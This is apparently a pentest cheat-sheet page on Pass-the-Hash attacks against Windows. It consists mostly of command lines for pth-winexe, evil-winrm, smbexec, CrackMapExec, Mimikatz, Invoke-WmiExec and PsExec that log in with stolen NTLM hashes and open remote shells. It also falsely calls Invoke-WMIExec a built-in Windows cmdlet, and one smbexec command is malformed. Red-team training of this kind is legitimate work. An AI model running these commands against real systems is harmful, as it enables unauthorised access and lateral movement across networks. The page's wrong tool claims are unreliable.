# Pass-the-Hash

A Pass-the-Hash (PtH) attack is a credential theft technique primarily targeting Windows-based systems. In this attack, an attacker obtains the hashed password of a user and uses it to authenticate as that user, bypassing the need for the actual plain-text password.

[#pass-the-hash-attack](../../executive-pt/post-exploitation/windows-post-exploitation/windows-dump-crack-hashes.md#pass-the-hash-attack "mention")

## Authentication through the stolen password hash

This is the main step where the adversary passes the hash to impersonate the user and gain access to the remote system.

### With pth-winexec (From Kali)

* [GitHub - byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
* [Pass the Hash toolkit, Winexe | Kali Linux](https://www.kali.org/tutorials/pass-the-hash-toolkit-winexe-updates/)

```bash
pth-winexe -U $USER_ACCOUNT%$NTLM_HASH //$HOST_IP powershell
```

### With evil-winrm (From Kali)

The "evil-winrm" tool is a Ruby gem that enables the execution of remote commands on a Windows machine using the Windows Remote Management (WinRM) protocol.

```bash
evil-winrm -u $USER_ACCOUNT -H $NTLM_HASH -i $HOST_IP
```

### With SMBExec (From Kali)

```bash
cd /usr/share/doc/python3-impacket/examples/smbexec.py .

python3 smbexec.py <DOMAIN>/<USER>@<IP> -hashes <LMHASH>:<NTHASH>
```

### With CrackMapExec (From Kali)

```bash
crackmapexec smb <IP> -u USER -H <LM:NT>
```





### With Mimikatz (From Windows attack  machine)

{% code overflow="wrap" %}
```powershell
.\mimikatz.exe "sekurlsa::pth /user:$USER /domain:domain.com /ntlm:$NTLM_HASH /run:powershell.exe"
```
{% endcode %}

More details in this page: [mimikatz.md](../../../tools/tools/mimikatz.md "mention")

### With Powershell (PowerView) (From Windows attack Machine

It is common for adversaries to use the _**Invoke-WMIExec**_ cmdlet, which allows execution of arbitrary commands on a remote Windows machine using WMI (Windows Management Instrumentation), to perform a PtH attack.

{% code overflow="wrap" %}
```powershell
Invoke-WmiExec -target $HOST_IP -hash a0c8746a6efc7782c7c19c55185145be -username Alice -command powershell
```
{% endcode %}

{% hint style="info" %}
Note that Invoke-WMIExec is a built-in PowerShell cmdlet that is present in many recent Windows systems. This feature enables the execution of arbitrary commands on a remote Windows machine through Windows Management Instrumentation (WMI). You can run Invoke-WMIExec directly from a PowerShell prompt or integrate it into a PowerShell script.
{% endhint %}



## Accessing resources through new user account

In the third step, we uses the newly obtained user account to expand their network access. For instance, the adversary can use a command-line utility called **PsExec** to perform remote code execution on another host.

```powershell
psexec.exe \\$HOST_IP cmd.exe
```



## References

{% embed url="https://book.hacktricks.xyz/windows-hardening/ntlm#pass-the-hash" %}

